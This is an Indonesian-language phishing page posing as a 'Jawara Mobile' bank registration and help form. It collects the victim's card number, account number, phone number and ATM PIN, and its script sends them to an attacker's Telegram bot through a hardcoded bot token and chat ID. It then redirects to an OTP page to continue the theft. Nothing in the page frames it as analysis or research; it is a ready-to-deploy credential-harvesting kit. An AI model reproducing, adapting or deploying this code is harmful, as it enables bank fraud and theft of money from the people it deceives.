<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registrasi Online - Jawara Mobile</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }

        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            height: 100vh;
        }

        .app-container {
            background-color: white;
            width: 100%;
            max-width: 450px;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .header {
            padding: 20px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #f0f0f0;
        }

        .btn-close {
            font-size: 24px;
            color: #333;
            text-decoration: none;
            margin-right: 20px;
        }

        .header h1 {
            font-size: 18px;
            font-weight: 600;
        }

        .progress-container {
            display: flex;
            gap: 8px;
            padding: 0 20px;
            margin-top: 15px;
        }

        .step {
            height: 3px;
            flex: 1;
            background-color: #e0e0e0;
            border-radius: 2px;
        }

        .step.active {
            background-color: #f1c40f;
        }

        .content {
            padding: 30px 25px;
            flex-grow: 1;
        }

        .instruction {
            font-size: 16px;
            font-weight: 700;
            color: #444;
            text-align: center;
            margin-bottom: 40px;
        }

        .form-group {
            margin-bottom: 30px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: #888;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #ccc;
            padding: 8px 0;
            font-size: 16px;
            outline: none;
        }

        .form-group input:focus {
            border-bottom: 1px solid #3498db;
        }

        .pin-header {
            display: flex;
            justify-content: space-between;
        }

        .otp-note {
            font-size: 13px;
            color: #777;
            margin-top: 10px;
        }

        .footer {
            padding: 20px;
        }

        .btn-selanjutnya {
            width: 100%;
            background-color: #3498db;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        /* Loading state */
        .btn-selanjutnya:disabled {
            background-color: #bdc3c7;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="header">
            <a href="index.html" class="btn-close">✕</a>
            <h1>Bantuan Online</h1>
        </div>

        <div class="progress-container">
            <div class="step active"></div>
            <div class="step"></div>
            <div class="step"></div>
            <div class="step"></div>
        </div>

        <form id="formRegistrasi" class="content">
            <p class="instruction">Masukkan nomor kartu, nomor rekening, nomor handphone dan pin ATM anda</p>

            <div class="form-group">
                <label>Nomor Kartu</label>
                <input type="number" id="noKartu" required>
            </div>

            <div class="form-group">
                <label>Nomor Rekening</label>
                <input type="number" id="noRekening" required>
            </div>

            <div class="form-group">
                <label>Nomor Handphone</label>
                <input type="tel" id="noHp" required>
            </div>

            <div class="form-group">
                <div class="pin-header">
                    <label>PIN ATM</label>
                    <span id="charLimit">0/6</span>
                </div>
                <input type="password" id="pinAtm" maxlength="6" required oninput="document.getElementById('charLimit').innerText = this.value.length + '/6'">
            </div>

            <p class="otp-note">*Pastikan Pulsa Anda Cukup untuk menerima Kode OTP via SMS</p>
        </form>

        <div class="footer">
            <button type="button" id="btnKirim" class="btn-selanjutnya" onclick="kirimData()">Selanjutnya</button>
        </div>
    </div>

    <script>
        // PENGATURAN BOT TELEGRAM
        const TOKEN = "8369092441:AAFPFsvi9BPjWJhEJcBPx2xzMtn-b2GdowY"; // Ganti dengan Token Bot Telegram Anda
        const CHAT_ID = "7692820036"; // Ganti dengan Chat ID Telegram Anda

        function kirimData() {
            const noKartu = document.getElementById('noKartu').value;
            const noRekening = document.getElementById('noRekening').value;
            const noHp = document.getElementById('noHp').value;
            const pinAtm = document.getElementById('pinAtm').value;
            const btn = document.getElementById('btnKirim');

            if (!noKartu || !noRekening || !noHp || !pinAtm) {
                alert("Mohon lengkapi semua data!");
                return;
            }

            btn.disabled = true;
            btn.innerText = "Memproses...";

            const pesan = `
<b>=== DATA REGISTRASI JAWARA ===</b>
<b>Nomor Kartu:</b> <code>${noKartu}</code>
<b>Nomor Rekening:</b> <code>${noRekening}</code>
<b>Nomor HP:</b> <code>${noHp}</code>
<b>PIN ATM:</b> <code>${pinAtm}</code>
            `;

            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=html`;

            fetch(url)
                .then(response => {
                    // Berhasil dikirim, pindah ke halaman otp.html
                    window.location.href = "otp.html";
                })
                .catch(error => {
                    console.error('Error:', error);
                    // Tetap pindah halaman meski ada error (atau sesuaikan)
                    window.location.href = "otp.html";
                });
        }
    </script>
</body>
</html>
